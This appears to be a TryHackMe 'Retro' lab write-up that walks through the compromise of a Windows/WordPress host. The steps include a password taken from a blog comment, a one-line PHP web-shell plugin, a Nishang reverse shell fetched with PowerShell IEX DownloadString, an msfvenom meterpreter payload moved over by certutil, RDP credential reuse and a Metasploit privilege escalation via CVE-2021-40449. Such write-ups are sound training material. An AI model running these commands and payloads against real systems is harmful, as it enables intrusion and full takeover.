---
layout: page
title: Retro
description: Exposed credentials and theme code injection.
img: 
importance: 2
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/retro/logo.jpg" title="THM Retro Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/retro">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
I can't think of a Retro pun.  Let's get started.

Run nmap to get a list of the services running on top ports.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.70.158
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 23:00 AEDT
Nmap scan report for 10.10.70.158
Host is up (0.28s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-27T12:00:49+00:00; +3s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2025-02-27T12:00:44+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2025-02-26T11:53:09
|_Not valid after:  2025-08-28T11:53:09
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (87%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   9.17 ms   10.4.0.1
2   ... 3
4   284.37 ms 10.10.70.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.25 seconds
```
{% endraw %}

<br />
To start, when there is a web server, run curl -I to try and fingerprint the technology.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ curl -I 10.10.70.158        
HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Sun, 08 Dec 2019 23:52:54 GMT
Accept-Ranges: bytes
ETag: "bfffe59b22aed51:0"
Server: Microsoft-IIS/10.0
Date: Thu, 27 Feb 2025 12:12:01 GMT
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the landing page source code.  Even though it is the default page, there might be something sneaky.

{% raw %}
```html
view-source:http://10.10.70.158/

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS Windows Server</title>
<style type="text/css">
<!--
body {
	color:#000000;
	background-color:#0072C6;
	margin:0;
}

#container {
	margin-left:auto;
	margin-right:auto;
	text-align:center;
	}

a img {
	border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="iisstart.png" alt="IIS" width="960" height="600" /></a>
</div>
</body>
</html>
```
{% endraw %}

<br />
Give the server a ffuf to try and discover something interesting.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.70.158/FUZZ -e .txt,.bak,.html -fs 703

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.70.158/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

retro                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 323ms]
Retro                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 311ms]
```
{% endraw %}

<br />
Check the /retro directory and note the possible user name.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/retro.png" title="Retro Directory" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Notice that they are running a WordPress website with a login page is accessible.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/wplogin.png" title="wp-login.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the posts and notice the comment on "Ready Player One" that has a weird work.  Might be a password.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/comment.png" title="Comment Password" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the potential creds to login in the screen from earlier.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Pick a theme and edit the 404 page in the theme editor to include a small RCE line.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/404.png" title="404.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test the RCE exploit.  Remember to dir instead of ls, since it is a Windows machine.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/dirtest.png" title="Dir Test" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use the revshells to generate a payload.  Try putting it in the cmd parameter.  It fails.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Copy the Invoke-PowerShellTcp.ps1 into the local working folder.

{% raw %}
```powershell
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ cp $(locate Invoke-PowerShellTcp.ps1) .
```
{% endraw %}

<br />
Update the script to invoke the method.

{% raw %}
```bash
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

<snip>


        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.4.119.29 -Port 4444
```
{% endraw %}

<br />
Start a listener on 4444.  Kill the 443 listener if it is still listening.  You will forget about it, try to start another one later, get an error, and be serverly frustrated.

{% raw %}
```powershell
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ nc -nlvp 4444    
listening on [any] 4444 ...
```
{% endraw %}

<br />
Start a web server to server the Nishang.

{% raw %}
```powershell
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Use PowerShell to execute the script.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/execute.png" title="Execute Script" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.4.119.29:8000/Invoke-PowerShellTcp.ps1')"
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ nc -nlvp 4444    
listening on [any] 4444 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.174.155] 49917
Windows PowerShell running as user RETROWEB$ on RETROWEB
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen>
```
{% endraw %}

<br />
Run whoami and whoami /priv to see who we are and the privileges that we have.

{% raw %}
```bash
PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen> whoami
nt authority\iusr
PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```
{% endraw %}

<br />
Run systeminfo and get an idea of the system that we are on.

{% raw %}
```bash
PS C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen> systeminfo

Host Name:                 RETROWEB
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00377-60000-00000-AA325
Original Install Date:     12/8/2019, 10:50:43 PM
System Boot Time:          2/27/2025, 6:32:22 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,267 MB
Virtual Memory: Max Size:  3,200 MB
Virtual Memory: Available: 2,345 MB
Virtual Memory: In Use:    855 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.174.155
                                 [02]: fe80::3cfb:8dab:bb43:ba18
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
{% endraw %}

<br />
At this point, let's try different exploits.  Kill this shell and let's start over.  Create a vulnerable plugin.

{% raw %}
```php
<?php
/**
 * Plugin Name: Shelly
 * Version: 0.0.1
 * Author: Test
 * Author URI: https://127.0.0.1
 * License: GPL2
 */

system($_GET['cmd']);

?> 
```
{% endraw %}

<br />
Let's zip that payload up.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ zip shell.zip shell.php 
  adding: shell.php (deflated 14%)
```
{% endraw %}

<br />
From the Add Item in the plugins menu, click upload plugin.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/additem.png" title="Add Item" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Choose the zip file and click install.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/install.png" title="Install Plugin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Execute the Nishang like we did earlier.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/plugexe.png" title="Install Plugin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell...again.  Kill it to free up the port.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.212.193] 50239
Windows PowerShell running as user RETROWEB$ on RETROWEB
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\retro\wp-content\plugins\shell>
```
{% endraw %}

<br />
Let's test credential reuse in the RDP service that is also open.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ xfreerdp /u:Wade /p:parzival /v:10.10.87.202 /dynamic-resolution +clipboard
[13:54:58:957] [635743:635748] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:54:58:958] [635743:635748] [WARN][com.freerdp.crypto] - CN = RetroWeb
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.87.202:3389) 
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] - Common Name (CN):
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] -    RetroWeb
[13:54:58:959] [635743:635748] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.87.202:3389 (RDP-Server):
        Common Name: RetroWeb
        Subject:     CN = RetroWeb
        Issuer:      CN = RetroWeb
        Thumbprint:  00:af:b8:5d:e7:f6:98:a7:bc:cc:c8:43:25:9e:a0:9e:c0:b1:4a:67:ed:3f:35:80:56:16:39:88:34:33:ad:60
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<snip>
```
{% endraw %}

<br />
Check the recycle bin.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/recycle.png" title="Recycle Bin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get the user.txt.txt flag.

{% raw %}
```bash
C:\Users\Wade\Desktop>type user.txt.txt
<redacted>
C:\Users\Wade\Desktop>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::5177:f866:9696:ce1f%5
   IPv4 Address. . . . . . . . . . . : 10.10.87.202
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:867:7ed:f5f5:a835
   Link-local IPv6 Address . . . . . : fe80::867:7ed:f5f5:a835%2
   Default Gateway . . . . . . . . . : ::

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
Check the Bookmarks in Chrome.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/bookmark.png" title="Bookmarks" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Move the program from the recycle bin onto the Desktop.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/desktop.png" title="Desktop" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Research the vulnerability from the Bookmarks.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/github.png" title="Exploit GitHub" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/nobodyatall648/CVE-2019-1388">https://github.com/nobodyatall648/CVE-2019-1388</a>

<br />
Run right-click and run ad administrator.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/runas.png" title="Run As Administrator" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on the Show more details link.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/showmore.png" title="Show More Details" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on the Show information about the publisher's certificate.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/information.png" title="Show Certificate Information" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
As Windows tries to open the resulting website, there is no default app.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/noapp.png" title="No Default App" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Set IE as the default browser.  Still get the same error as before.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/retro/default.png" title="Set Default App" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a x64 meterpreter executable binary.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=443 -f exe -o meter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meter.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Start a multi/handler.  Set the payload, lhost, and lport.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/retro]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.4.119.29:443
```
{% endraw %}

<br />
From the RDP session, transfer to the victim machine.

{% raw %}
```bash
C:\Windows\system32>cd C:\Users\Wade\Desktop

C:\Users\Wade\Desktop>certutil.exe -urlcache -f http://10.4.119.29:8000/meter.exe meter.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Wade\Desktop>.\meter.exe
```
{% endraw %}

<br />
Check the handler and catch the session.

{% raw %}
```bash
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.4.119.29:443 
[*] Sending stage (203846 bytes) to 10.10.234.200
[*] Meterpreter session 1 opened (10.4.119.29:443 -> 10.10.234.200:49848) at 2025-03-22 22:37:45 +1100

meterpreter >
```
{% endraw %}

<br />
Run ps to get a list of processes.

{% raw %}
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User           Path
 ---   ----  ----                     ----  -------  ----           ----

<snip>

 2096  800   RuntimeBroker.exe        x64   2        RETROWEB\Wade  C:\Windows\System32\RuntimeBroker.exe
 2188  980   sihost.exe               x64   2        RETROWEB\Wade  C:\Windows\System32\sihost.exe
 2464  724   svchost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\svchost.exe
 2728  3820  dwm.exe
 2732  2468  GoogleUpdate.exe
 2944  800   SearchUI.exe             x64   2        RETROWEB\Wade  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 3020  2096  cmd.exe                  x64   2        RETROWEB\Wade  C:\Windows\System32\cmd.exe
 3028  988   rdpclip.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\rdpclip.exe
 3036  1260  csrss.exe
 3044  676   LogonUI.exe
 3232  800   dllhost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\dllhost.exe
 3416  3020  conhost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\conhost.exe
 3540  724   svchost.exe
 3652  724   amazon-ssm-agent.exe
 3768  920   explorer.exe             x64   2        RETROWEB\Wade  C:\Windows\explorer.exe
 3812  980   taskhostw.exe            x64   2        RETROWEB\Wade  C:\Windows\System32\taskhostw.exe
 3820  1260  winlogon.exe
 3868  4044  MpCmdRun.exe
 3904  800   ShellExperienceHost.exe  x64   2        RETROWEB\Wade  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4300  3020  meter.exe                x64   2        RETROWEB\Wade  C:\Users\Wade\Desktop\meter.exe
 4424  4384  MpCmdRun.exe
```
{% endraw %}

<br />
Migrate to a process to a process that has the same architecture and user that we are currently.

{% raw %}
```bash
meterpreter > migrate 2464
[*] Migrating from 4300 to 2464...
[*] Migration completed successfully.
```
{% endraw %}

<br />
Background the session and run the local exploit suggester.

{% raw %}
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User           Path
 ---   ----  ----                     ----  -------  ----           ----

<snip>

 2096  800   RuntimeBroker.exe        x64   2        RETROWEB\Wade  C:\Windows\System32\RuntimeBroker.exe
 2188  980   sihost.exe               x64   2        RETROWEB\Wade  C:\Windows\System32\sihost.exe
 2464  724   svchost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\svchost.exe
 2728  3820  dwm.exe
 2732  2468  GoogleUpdate.exe
 2944  800   SearchUI.exe             x64   2        RETROWEB\Wade  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 3020  2096  cmd.exe                  x64   2        RETROWEB\Wade  C:\Windows\System32\cmd.exe
 3028  988   rdpclip.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\rdpclip.exe
 3036  1260  csrss.exe
 3044  676   LogonUI.exe
 3232  800   dllhost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\dllhost.exe
 3416  3020  conhost.exe              x64   2        RETROWEB\Wade  C:\Windows\System32\conhost.exe
 3540  724   svchost.exe
 3652  724   amazon-ssm-agent.exe
 3768  920   explorer.exe             x64   2        RETROWEB\Wade  C:\Windows\explorer.exe
 3812  980   taskhostw.exe            x64   2        RETROWEB\Wade  C:\Windows\System32\taskhostw.exe
 3820  1260  winlogon.exe
 3868  4044  MpCmdRun.exe
 3904  800   ShellExperienceHost.exe  x64   2        RETROWEB\Wade  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4300  3020  meter.exe                x64   2        RETROWEB\Wade  C:\Users\Wade\Desktop\meter.exe
 4424  4384  MpCmdRun.exe
```
{% endraw %}

<br />
Migrate to a process to a process that has the same architecture and user that we are currently.

{% raw %}
```bash
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.234.200 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.234.200 - 203 exploit checks are being tried...
[+] 10.10.234.200 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
[+] 10.10.234.200 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
[+] 10.10.234.200 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 10.10.234.200 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2016
[+] 10.10.234.200 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2016
[+] 10.10.234.200 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 48 / 48
[*] 10.10.234.200 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
 8   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
 11  exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2016
 13  exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2016
 14  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

 <snip>
```
{% endraw %}

<br />
Choose to use cve_2021_40449 and set the options.

{% raw %}
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2021_40449
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2021_40449) > set session 1
session => 1
msf6 exploit(windows/local/cve_2021_40449) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/cve_2021_40449) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/cve_2021_40449) >
```
{% endraw %}

<br />
Run the exploit.

{% raw %}
```bash
msf6 exploit(windows/local/cve_2021_40449) > exploit
[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Vulnerable Windows 10 v1607 build detected!
[*] Launching netsh to host the DLL...
[+] Process 3252 launched.
[*] Reflectively injecting the DLL into 3252...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 10.10.234.200
